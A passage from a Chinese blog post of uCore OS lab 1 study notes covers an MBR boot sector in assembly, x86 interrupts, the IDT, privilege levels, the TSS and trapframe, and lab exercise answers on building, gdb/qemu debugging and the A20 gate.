窗口左上角的(X,Y)位置</span></span><br><span class="line"><span class="comment">;(DL,DH) = 窗口右下角的(X,Y)位置</span></span><br><span class="line"><span class="comment">;无返回值：</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">ax</span>, <span class="number">0x600</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">bx</span>, <span class="number">0x700</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">cx</span>, <span class="number">0</span>          <span class="comment">; 左上角: (0, 0)</span></span><br><span class="line">  <span class="keyword">mov</span>     <span class="built_in">dx</span>, <span class="number">0x184f</span>     <span class="comment">; 右下角: (80,25),</span></span><br><span class="line">        <span class="comment">; VGA文本模式中,一行只能容纳80个字符,共25行。</span></span><br><span class="line">        <span class="comment">; 下标从0开始,所以0x18=24,0x4f=79</span></span><br><span class="line">  <span class="keyword">int</span>     <span class="number">0x10</span>            <span class="comment">; int 0x10</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">; 输出背景色绿色，前景色红色，并且跳动的字符串“1 MBR”</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x00</span>], <span class="string">'1'</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x01</span>], <span class="number">0xa4</span>   <span class="comment">; A表示绿色背景闪烁，4 表示前景色为红色</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x02</span>], <span class="string">' '</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x03</span>], <span class="number">0xa4</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x04</span>], <span class="string">'M'</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x05</span>], <span class="number">0xa4</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x06</span>], <span class="string">'B'</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x07</span>], <span class="number">0xa4</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x08</span>], <span class="string">'R'</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">byte</span> [<span class="built_in">gs</span>:<span class="number">0x09</span>], <span class="number">0xa4</span></span><br><span class="line">  <span class="keyword">jmp</span> $   <span class="comment">; 始终跳转到这条代码，为死循环，使程序悬停在此</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">; 用\0 将剩余空间填满</span></span><br><span class="line">  <span class="built_in">times</span> <span class="number">510</span>-($-$$) <span class="built_in">db</span> <span class="number">0</span></span><br><span class="line">  <span class="comment">; 最后两位一定是0x55, 0xaa</span></span><br><span class="line">  <span class="built_in">db</span> <span class="number">0x55</span>,<span class="number">0xaa</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="9-中断与异常（重要）">9. 中断与异常（重要）</h3>
<ul>
<li>在操作系统中，有三种特殊的中断事件：
<ul>
<li>异步中断(asynchronous interrupt)。这是由CPU外部设备引起的外部事件中断，例如I/O中断、时钟中断、控制台中断等。</li>
<li>同步中断(synchronous interrupt)。这是CPU执行指令期间检测到不正常的或非法的条件(如除零错、地址访问越界)所引起的内部事件。</li>
<li>陷入中断(trap interrupt)。这是在程序中使用请求系统服务的系统调用而引发的事件。</li>
</ul>
</li>
<li>当CPU收到中断或者异常的事件时，它会暂停执行当前的程序或任务，通过一定的机制跳转到负责处理这个信号的相关处理例程中，在完成对这个事件的处理后再跳回到刚才被打断的程序或任务中。</li>
<li>其中，中断向量和中断服务例程的对应关系主要是由IDT（中断描述符表）负责。操作系统在IDT中设置好各种中断向量对应的中断描述符，留待CPU在产生中断后查询对应中断服务例程的起始地址。而IDT本身的起始地址保存在<code>idtr</code>寄存器中。</li>
<li>当CPU进入中断处理例程时，<code>eflags</code>寄存器上的<code>IF</code>标志位将会自动被CPU置为0，待中断处理例程结束后才恢复<code>IF</code>标志。</li>
</ul>
<h4 id="a-中断描述符表">a. 中断描述符表</h4>
<ul>
<li>中断描述符表（Interrupt Descriptor Table, IDT）把每个中断或异常编号和一个指向中断服务例程的描述符联系起来。同GDT一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符。</li>
<li>IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址。</li>
</ul>
<h4 id="b-IDT-gate-descriptors">b. IDT gate descriptors</h4>
<ul>
<li>
<p>中断/异常应该使用<code>Interrupt Gate</code>或<code>Trap Gate</code>。其中的唯一区别就是：当调用<code>Interrupt Gate</code>时，Interrupt会被CPU自动禁止；而调用<code>Trap Gate</code>时，CPU则不会去禁止或打开中断，而是保留原样。</p>
<blockquote>
<p>这其中的原理是当CPU跳转至<code>Interrupt Gate</code>时，其eflag上的IF位会被清除。而<code>Trap Gate</code>则不改变。</p>
</blockquote>
</li>
<li>
<p>IDT中包含了3种类型的Descriptor</p>
<ul>
<li>Task-gate descriptor</li>
<li>Interrupt-gate descriptor （中断方式用到）</li>
<li>Trap-gate descriptor（系统调用用到）<br>
下图图显示了80386的中断门描述符、陷阱门描述符的格式：<br>
<img src="/2020/08/uCore-1/gate.png" alt="img"></li>
</ul>
</li>
</ul>
<h4 id="c-中断处理过程">c. 中断处理过程</h4>
<h5 id="1-起始阶段">1) 起始阶段</h5>
<ul>
<li>CPU执行完每条指令后，判断中断控制器中是否产生中断。如果存在中断，则取出对应的中断变量。</li>
<li>CPU根据中断变量，到IDT中找到对应的中断描述符。</li>
<li>通过获取到的中断描述符中的段选择子，从GDT中取出对应的段描述符。此时便获取到了中断服务例程的段基址与属性信息，跳转至该地址。</li>
<li>CPU会根据CPL和中断服务例程的段描述符的DPL信息确认是否发生了特权级的转换。若发生了特权级的转换，这时CPU会从当前程序的TSS信息（该信息在内存中的起始地址存在TR寄存器中）里取得该程序的内核栈地址，即包括内核态的ss和esp的值，并立即将系统当前使用的栈切换成新的内核栈。这个栈就是即将运行的中断服务程序要使用的栈。紧接着就将当前程序使用的用户态的ss和esp压到新的内核栈中保存起来；</li>
<li>CPU需要<strong>开始保存当前被打断的程序的现场</strong>（即一些寄存器的值），以便于将来恢复被打断的程序继续执行。这需要利用内核栈来保存相关现场信息，即依次压入当前被打断程序使用的eflags，cs，eip，errorCode（如果是有错误码的异常）信息；</li>
<li>CPU利用中断服务例程的段描述符将其第一条指令的地址加载到cs和eip寄存器中，<strong>开始执行中断服务例程</strong>。这意味着先前的程序被暂停执行，中断服务程序正式开始工作。</li>
</ul>
<h5 id="2-终止阶段">2) 终止阶段</h5>
<ul>
<li>每个中断服务例程在有中断处理工作完成后需要通过<code>iret</code>（或<code>iretd</code>）指令恢复被打断的程序的执行。CPU执行IRET指令的具体过程如下：
<ul>
<li>程序执行这条iret指令时，首先会从内核栈里弹出先前保存的被打断的程序的现场信息，即eflags，cs，eip重新开始执行；</li>
<li>如果存在特权级转换（从内核态转换到用户态），则还需要从内核栈中弹出用户态栈的ss和esp，即栈也被切换回原先使用的用户栈。</li>
<li>如果此次处理的是带有错误码（errorCode）的异常，CPU在恢复先前程序的现场时，并不会弹出errorCode，需要要求相关的中断服务例程在调用iret返回之前添加出栈代码主动弹出errorCode。</li>
</ul>
</li>
</ul>
<h3 id="10-特权级">10. 特权级</h3>
<blockquote>
<p>尽管特权级相关的内容在Lab2课程中提及，但由于Lab1中的Challenge会涉及到特权级的改变，故将该部分的内容迁移至此处。</p>
</blockquote>
<ul>
<li>特权级共分为四档，分别为0-3，其中<code>Kernel</code>为第0特权级（ring 0），用户程序为第3特权级（ring 3），操作系统保护分别为第1和第2特权级。</li>
<li>特权级的区别
<ul>
<li>一些指令（例如特权指令<code>lgdt</code>）只能运行在ring 0下。</li>
<li>CPU在如下时刻会检查特权级
<ul>
<li>访问数据段</li>
<li>访问页</li>
<li>进入中断服务例程（ISRs）</li>
<li>…</li>
</ul>
</li>
<li>如果检查失败，则会产生<strong>保护异常（General Protection Fault）</strong>.</li>
</ul>
</li>
</ul>
<h4 id="1-CPL、DPL、RPL与IOPL">1. CPL、DPL、RPL与IOPL</h4>
<ul>
<li>
<p><strong>DPL存储于段描述符中</strong>，规定<strong>访问该段的权限级别</strong>(Descriptor Privilege Level)，每个段的DPL固定。<br>
当进程访问一个段时，需要进程特权级检查。</p>
</li>
<li>
<p><strong>CPL</strong>存在于CS寄存器的低两位，<strong>即CPL是CS段描述符的DPL</strong>，是当前代码的权限级别(Current Privilege Level)。</p>
</li>
<li>
<p><strong>RPL存在于段选择子中</strong>，说明的是<strong>进程对段访问的请求权限</strong>(Request Privilege Level)，是对于<strong>段选择子</strong>而言的，每个段选择子有自己的RPL。而且RPL对每个段来说不是固定的，两次访问同一段时的RPL可以不同。RPL可能会削弱CPL的作用，例如当前CPL=0的进程要访问一个数据段，它把段选择符中的RPL设为3，这样虽然它对该段仍然只有特权为3的访问权限。</p>
</li>
<li>
<p>IOPL(I/O Privilege Level)即I/O特权标志，位于<strong>eflag寄存器</strong>中，用两位二进制位来表示，也称为I/O特权级字段。该字段指定了要求执行I/O指令的特权级。如 果当前的特权级别在数值上小于等于IOPL的值，那么，该I/O指令可执行，否则将发生一个保护异常。</p>
<blockquote>
<p>只有当CPL=0时，可以改变IOPL的值，当CPL&lt;=IOPL时，可以改变IF标志位。</p>
</blockquote>
</li>
</ul>
<h4 id="2-特权级检查">2. 特权级检查</h4>
<blockquote>
<p>在下述的特权级比较中，需要注意特权级越低，其ring值越大。</p>
</blockquote>
<ul>
<li>
<p>访问门时（中断、陷入、异常），要求<strong>DPL[段] &lt;= CPL &lt;= DPL[门]</strong></p>
<blockquote>
<p>访问门的代码权限<strong>比门的特权级要高</strong>，因为这样才能访问门。</p>
<p>但访问门的代码权限<strong>比被访问的段的权限要低</strong>，因为通过门的目的是<strong>访问特权级更高的段</strong>，这样就可以达到<strong>低权限应用程序使用高权限内核服务</strong>的目的。</p>
</blockquote>
</li>
<li>
<p>访问段时，要求<strong>DPL[段] &gt;= max {CPL, RPL}</strong></p>
<blockquote>
<p>只能使用最低的权限来访问段数据。</p>
</blockquote>
</li>
</ul>
<h4 id="3-通过中断切换特权级">3. 通过中断切换特权级</h4>
<h5 id="1-TSS">1) TSS</h5>
<ul>
<li>
<p><strong>TSS(Task State Segment)</strong> 是操作系统在进行进程切换时保存进程现场信息的段，其结构如下<br>
<img src="/2020/08/uCore-1/tss.png" alt="img"></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* task state segment format (as described by the Pentium architecture book) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">taskstate</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ts_link;        <span class="comment">// old ts selector</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_esp0;        <span class="comment">// stack pointers and segment selectors</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ss0;        <span class="comment">// after an increase in privilege level</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding1;</span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_esp1;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ss1;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding2;</span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_esp2;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ss2;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding3;</span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_cr3;        <span class="comment">// page directory base</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_eip;        <span class="comment">// saved state from last task switch</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ts_eflags;</span><br><span class="line">    <span class="keyword">uint32_t</span> ts_eax;        <span class="comment">// more saved state (registers)</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ts_ecx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ts_edx;</span><br><span class="line">    <span class="keyword">uint32_t</span> ts_ebx;</span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_esp;</span><br><span class="line">    <span class="keyword">uintptr_t</span> ts_ebp;</span><br><span class="line">    <span class="keyword">uint32_t</span> ts_esi;</span><br><span class="line">    <span class="keyword">uint32_t</span> ts_edi;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_es;            <span class="comment">// even more saved state (segment selectors)</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding4;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding5;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding6;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding7;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding8;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding9;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_ldt;</span><br><span class="line">    <span class="keyword">uint16_t</span> ts_padding10;</span><br><span class="line">    <span class="keyword">uint16_t</span> <span class="keyword">ts_t</span>;            <span class="comment">// trap on task switch</span></span><br><span class="line">    <span class="keyword">uint16_t</span> ts_iomb;        <span class="comment">// i/o map base address</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p>这里暂时只说明<strong>特权级切换相关</strong>的项。其中，TSS中分别保留了ring0、ring1、ring2的栈(<code>ss</code>、<code>esp</code>寄存器值)。当用户程序从ring3跳至ring0时(例如执行中断)，此时的栈就会从用户栈切换到内核栈。切换栈的操作从开始中断的那一瞬间（例如：从<code>int 0x78</code>到中断处理例程之间）就已完成。</p>
<blockquote>
<p>切换栈的操作为修改<code>esp</code>和<code>ss</code>寄存器。</p>
</blockquote>
</li>
<li>
<p>TSS段的段描述符保存在GDT中，其<code>ring0</code>的栈会在初始化GDT时被一起设置。<code>TR</code>寄存器会保存当前TSS的段描述符，以提高索引速度。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">segdesc</span> <span class="title">gdt</span>[] = &#123;</span></span><br><span class="line">    SEG_NULL,</span><br><span class="line">    [SEG_KTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_KDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_KERNEL),</span><br><span class="line">    [SEG_UTEXT] = SEG(STA_X | STA_R, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_UDATA] = SEG(STA_W, <span class="number">0x0</span>, <span class="number">0xFFFFFFFF</span>, DPL_USER),</span><br><span class="line">    [SEG_TSS]   = SEG_NULL,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">pseudodesc</span> <span class="title">gdt_pd</span> = &#123;</span></span><br><span class="line">      <span class="keyword">sizeof</span>(gdt) - <span class="number">1</span>, (<span class="keyword">uintptr_t</span>)gdt</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* gdt_init - initialize the default GDT and TSS */</span></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">  gdt_init(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// 设置TSS的ring0栈地址，包括esp寄存器和SS段寄存器</span></span><br><span class="line">      load_esp0((<span class="keyword">uintptr_t</span>)bootstacktop);</span><br><span class="line">      ts.ts_ss0 = KERNEL_DS;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 将TSS写入GDT中</span></span><br><span class="line">      gdt[SEG_TSS] = SEGTSS(STS_T32A, (<span class="keyword">uintptr_t</span>)&amp;ts, <span class="keyword">sizeof</span>(ts), DPL_KERNEL);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载GDT至GDTR寄存器</span></span><br><span class="line">      lgdt(&amp;gdt_pd);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// 加载TSS至TR寄存器</span></span><br><span class="line">      ltr(GD_TSS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h5 id="2-trapFrame">2) trapFrame</h5>
<ul>
<li>
<p><code>trapframe</code>结构是进入中断门所必须的结构，其结构如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> &#123;</span></span><br><span class="line">    <span class="comment">// tf_regs保存了基本寄存器的值，包括eax,ebx,esi,edi寄存器等等</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pushregs</span> <span class="title">tf_regs</span>;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> tf_gs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding0;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_fs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding1;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_es;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding2;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ds;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding3;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_trapno;</span><br><span class="line">    <span class="comment">// 以下这些信息会被CPU硬件自动压入切换后的栈。包括下面切换特权级所使用的esp、ss等数据</span></span><br><span class="line">    <span class="keyword">uint32_t</span> tf_err;</span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_eip;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_cs;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding4;</span><br><span class="line">    <span class="keyword">uint32_t</span> tf_eflags;</span><br><span class="line">    <span class="comment">// 以下这些信息会在切换特权级时被使用</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> tf_esp;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_ss;</span><br><span class="line">    <span class="keyword">uint16_t</span> tf_padding5;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="3-中断处理例程的入口代码">3) 中断处理例程的入口代码</h5>
<ul>
<li>
<p>中断处理例程的入口代码用于保存上下文并构建一个<code>trapframe</code>，其源代码如下：</p>
  <figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">  #include &lt;memlayout<span class="number">.</span>h&gt;</span><br><span class="line"></span><br><span class="line"># vectors<span class="number">.</span>S sends all traps here.</span><br><span class="line"><span class="meta">.text</span></span><br><span class="line"><span class="meta">.globl</span> __alltraps</span><br><span class="line"><span class="symbol">__alltraps:</span></span><br><span class="line">    # <span class="keyword">push</span> registers to build a trap frame</span><br><span class="line">    # therefore make the stack look like a struct trapframe</span><br><span class="line">    pushl %ds</span><br><span class="line">    pushl %es</span><br><span class="line">    pushl %fs</span><br><span class="line">    pushl %gs</span><br><span class="line">    pushal</span><br><span class="line"></span><br><span class="line">    # load GD_KDATA <span class="keyword">into</span> %ds <span class="keyword">and</span> %es to set <span class="meta">up</span> data segments for kernel</span><br><span class="line">    movl $GD_KDATA, %eax</span><br><span class="line">    movw %ax, %ds</span><br><span class="line">    movw %ax, %es</span><br><span class="line"></span><br><span class="line">    # <span class="keyword">push</span> %esp to pass a pointer to the trapframe as an argument to trap()</span><br><span class="line">    pushl %esp</span><br><span class="line">    # <span class="keyword">call</span> trap(tf), where tf=%esp</span><br><span class="line">    <span class="keyword">call</span> trap</span><br><span class="line">    # <span class="keyword">pop</span> the pushed stack pointer</span><br><span class="line">    popl %esp</span><br><span class="line"></span><br><span class="line">    # return falls through to trapret...</span><br><span class="line"><span class="meta">.globl</span> __trapret</span><br><span class="line"><span class="symbol">__trapret:</span></span><br><span class="line">    # restore registers from stack</span><br><span class="line">    popal</span><br><span class="line"></span><br><span class="line">    # restore %ds, %es, %fs <span class="keyword">and</span> %gs</span><br><span class="line">    popl %gs</span><br><span class="line">    popl %fs</span><br><span class="line">    popl %es</span><br><span class="line">    popl %ds</span><br><span class="line"></span><br><span class="line">    # get rid of the trap number <span class="keyword">and</span> error code</span><br><span class="line">    addl <span class="number">$0</span>x8, %esp</span><br><span class="line">    <span class="keyword">iret</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h5 id="4-切换特权级的过程">4) 切换特权级的过程</h5>
<h6 id="a-特权级提升">a. 特权级提升</h6>
<p>当通过陷入门<strong>从ring3切换至ring0（特权提升）</strong> 时</p>
<ul>
<li>
<p>在陷入的一瞬间，CPU会因为特权级的改变，索引TSS，切换<code>ss</code>和<code>esp</code>为内核栈，并<strong>按顺序自动</strong>压入<code>user_ss</code>、<code>user_esp</code>、<code>user_eflags</code>、<code>user_cs</code>、<code>old_eip</code>以及<code>err</code>。</p>
<blockquote>
<p>需要注意的是，CPU先切换到内核栈，此时的<code>esp</code>与<code>ss</code>不再指向用户栈。但此时CPU却可以再将用户栈地址存入内核栈。这种操作可能是依赖硬件来完成的。</p>
</blockquote>
<blockquote>
<p>如果没有err，则CPU会自动压入0。</p>
</blockquote>
</li>
<li>
<p>之后CPU会在中断处理例程入口处，先将剩余的段寄存器以及所有的通用寄存器压栈，构成一个<code>trapframe</code>。然后将该<code>trapframe</code>传入给真正的中断处理例程并执行。</p>
</li>
<li>
<p>该处理例程会判断传入的中断数(<code>trapno</code>)并执行特定的代码。在<strong>提升特权级的代码</strong>中，程序会处理传入的<code>trapframe</code>信息中的<code>CS、DS、eflags</code>寄存器，修改上面的<strong>DPL、CPL与IOPL</strong>以达到提升特权的目的。</p>
</li>
<li>
<p>将修改后的<code>trapframe</code><strong>压入用户栈</strong>（这一步没有修改<code>user_esp</code>寄存器），并设置中断处理例程结束后将要弹出<code>esp</code>寄存器的值为<strong>用户栈的新地址</strong>（与刚刚不同，这一步修改了<strong>将要恢复</strong>的<code>user_esp</code>寄存器）。</p>
<blockquote>
<p>注意此时的用户栈地址指向的是修改后的<code>trapframe</code>。</p>
</blockquote>
<p>这样在退出中断处理程序，准备恢复上下文的时候，首先弹出的栈寄存器值是修改后的用户栈地址，其次弹出的通用寄存器、段寄存器等等都是存储于用户栈中的<code>trapframe</code>。</p>
<blockquote>
<p>为什么要做这么奇怪的操作呢？ 因为恢复<code>esp</code>寄存器的指令<strong>只有一条<code>pop %esp</code></strong></p>
<p>(当前环境下的<code>iret</code>指令不会弹出栈地址)。</p>
<p>正常情况下，中断处理例程结束，恢复<code>esp</code>寄存器后，<code>esp</code>指向的还是内核栈。</p>
<p>但我们的目的是切换回用户栈，则此时只能修改原先要恢复的<code>esp</code>值，通过该指令切换到用户栈。</p>
</blockquote>
<blockquote>
<p>思考一下，进入中断处理程序前，上下文<strong>保存在内核栈</strong>。但将要恢复回上下文的数据却<strong>存储于用户栈</strong>。</p>
</blockquote>
</li>
<li>
<p>在内核中，<code>将修改后的trapframe压入用户栈</code>这一步，需要舍弃<code>trapframe</code>中末尾两个旧的<code>ss</code>和<code>esp</code>寄存器数据，因为<code>iret</code>指令的特殊性：</p>
<ul>
<li>
<p><code>iret</code>指令的功能如下</p>
<blockquote>
<p><code>iret</code>指令会按顺序依次弹出<code>eip</code>、<code>cs</code>以及<code>eflag</code>的值到特定寄存器中，然后从新的<code>cs:ip</code>处开始执行。如果特权级发生改变，则还会在弹出<code>eflag</code>后再依次弹出<code>esp</code>与<code>ss</code>寄存器值。</p>
</blockquote>
</li>
<li>
<p>由于<code>iret</code>前后特权级不发生改变（<strong>[中断中]ring0 -&gt; ring0 [中断后]</strong>），故<code>iret</code>指令不会弹出<code>esp</code>和<code>ss</code>寄存器值。如果这两个寄存器也被复制进用户栈，则相比于进入中断前的用户栈地址，<code>esp</code>最终会抬高8个字节，可能造成很严重的错误。</p>
</li>
</ul>
</li>
</ul>
<h6 id="b-特权级降低">b. 特权级降低</h6>
<p>通过陷入门<strong>从ring0切换至ring3（特权降低）</strong> 的过程与特权提升的操作基本一样，不过有几个不同点需要注意一下</p>
<ul>
<li>
<p>与ring3调用中断不同，当ring0调用中断时，进入中断前和进入中断后的这个过程，栈不发生改变。</p>
<blockquote>
<p>因为在调用中断前的权限已经处于ring0了，而中断处理程序里的权限也是ring0，所以这一步陷入操作的特权级没有发生改变，故不需要访问TSS并重新设置<code>ss</code> 、<code>esp</code>寄存器。</p>
</blockquote>
</li>
<li>
<p>修改后的<code>trapFrame</code>不需要像上面那样保存至将要使用的栈，因为当前环境下<code>iret</code>前后特权级会发生改变，执行该命令会弹出<code>ss</code>和<code>esp</code>，所以可以通过<code>iret</code>来设置返回时的栈地址。</p>
</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="1-练习1">1. 练习1</h3>
<blockquote>
<p>理解通过make生成执行文件的过程.</p>
</blockquote>
<ul>
<li>操作系统镜像文件ucore.img是如何一步一步生成的？执行命令<code>make v=</code>，通过阅读其输出的步骤，我们可以得知
<ul>
<li>
<p>make执行将所有的源代码编译成对象文件，并分别链接形成<code>kernel</code>、<code>bootblock</code>文件。</p>
</li>
<li>
<p>使用<code>dd</code>命令，将生成的两个文件的数据拷贝至img文件中，形成映像文件。</p>
<blockquote>
<p><code>dd</code>命令与<code>cp</code>命令不同，该命令针对于磁盘，功能更加底层。</p>
</blockquote>
</li>
</ul>
</li>
<li>一个被系统认为是符合规范的硬盘主引导扇区的特征是什么？
<ul>
<li>
<p>阅读源码<code>lab1/tools/sign.c</code>，可以发现，<strong>符合规范的MBR特征是其512字节数据的最后两个字节是<code>0x55</code>、<code>0xAA</code></strong></p>
</li>
<li>
<p>以下是部分源码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 读取文件至内存中</span></span><br><span class="line"><span class="comment">// ....</span></span><br><span class="line"><span class="comment">// 修改512字节的最后两个字节为magic number</span></span><br><span class="line">buf[<span class="number">510</span>] = <span class="number">0x55</span>;</span><br><span class="line">buf[<span class="number">511</span>] = <span class="number">0xAA</span>;</span><br><span class="line"><span class="comment">// 写入内存中的数据至新文件中</span></span><br><span class="line"><span class="comment">// ....</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="2-练习2">2. 练习2</h3>
<blockquote>
<p>使用qemu执行并调试lab1中的软件。</p>
</blockquote>
<ul>
<li>
<p>修改<code>tools/gdbinit</code>为</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">file obj/bootblock.o</span><br><span class="line"><span class="built_in">set</span> architecture i8086</span><br><span class="line">target remote :<span class="number">1234</span></span><br><span class="line">b* <span class="number">0x7c00</span></span><br><span class="line"></span><br><span class="line">define hook-stop</span><br><span class="line">x/i $eip</span><br><span class="line">end</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<ul>
<li>gdb脚本中的<code>define hook-stop ... end</code>，可以在每次gdb断下时自动执行内部的指令。上面gdb脚本中的<code>define .. end</code>告诉gdb在每次断下时输出下一条指令，方便调试。</li>
<li>如果想单步调试BIOS，则可以删除<code>continue</code>。这样gdb就会在<code>0xfff0</code>处断下，然后我们就可以自由的单步跟踪。</li>
</ul>
</li>
<li>
<p>之后执行<code>make debug</code>命令，即可自动打开qemu与已经连接完成的gdb。</p>
</li>
<li>
<p>有个坑点：远程连接qemu时，<strong>最好不要使用pwndbg插件</strong>。因为使用该插件会导致连接到qemu后无法操作gdb。</p>
<blockquote>
<p><code>peda</code>插件可以正常使用。</p>
</blockquote>
</li>
<li>
<p>调试过程中有一个点需要注意：BIOS的前几条指令在GDB中都需要手动加上段寄存器的值，否则会显示错误，因为<code>cs</code>寄存器<strong>初始时非零</strong>；同时gdb默认只输出<code>$ip</code> 所指向地址的指针，而不是<code>cs:ip</code>。</p>
<ul>
<li>
<p>这是错误的指令输出</p>
<p><img src="/2020/08/uCore-1/gdbwrong.png" alt="img"></p>
</li>
<li>
<p>这是正确的指令输出</p>
<p><img src="/2020/08/uCore-1/gdbgood.png" alt="img"></p>
</li>
</ul>
<blockquote>
<p>最后感谢<a href="https://github.com/M-ouse" target="_blank" rel="noopener">@2st</a>师傅在BIOS调试中提供了帮助。</p>
</blockquote>
</li>
</ul>
<h3 id="3-练习3">3. 练习3</h3>
<blockquote>
<p>分析bootloader进入保护模式的过程.</p>
</blockquote>
<ul>
<li>
<p>为何开启A20，以及如何开启A20？</p>
<ul>
<li>
<p>Intel早期的8086 CPU提供了20根地址线，但寄存器只有16位，所以使用<strong>段寄存器值 &lt;&lt; 4 + 段内偏移值</strong>的方法来访问到所有内存，但按这种方式来计算出的地址的最大值为1088KB，超过20根地址线所能表示的范围，会发生“回卷”（和整数溢出有点类似）。但下一代的基于Intel 80286 CPU的计算机系统提供了24根地址线，当CPU计算出的地址超过1MB时便<strong>不会发生回卷</strong>，而这就造成了<strong>向下不兼容</strong>。为了保持完全的向下兼容性，IBM在计算机系统上加个硬件逻辑来模仿早期的回绕特征，而这就是<strong>A20 Gate</strong>。</p>
</li>
<li>
